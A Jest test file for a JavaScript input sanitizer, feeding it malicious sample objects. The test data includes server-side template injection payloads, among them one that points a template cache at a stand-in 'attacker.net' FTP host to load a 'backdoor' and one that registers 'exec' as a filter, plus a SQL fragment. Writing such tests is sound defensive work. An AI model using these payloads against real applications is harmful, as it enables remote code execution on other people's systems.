/* eslint-disable no-useless-concat */
/* eslint-disable prefer-template */
/* eslint-disable no-template-curly-in-string */
import { sanitizeContent, recursiveSanitizer } from '.';

describe('injection', () => {
  test('script injection', () => {
    const sample5 = '{hello}<>/`</%^&&';
    expect(sanitizeContent(sample5)).toBe('hello');
  });

  test('recursive-sanitizer', () => {
    const malObj = {
      firstname: "{% set cmd = 'id' %}",
      lastname: '{{self}}',
      fullname: '${process.env={}}hello',
      dob: new Date(),
      terms: true,
      arrObj: [
        {
          firstname:
            '{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}',
          lastname:
            '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}hello',
          fullname: "'SELECT * ftom whatever",
          dob: new Date(),
          terms: true,
        },
      ],
    };
    recursiveSanitizer(malObj);
  });
});
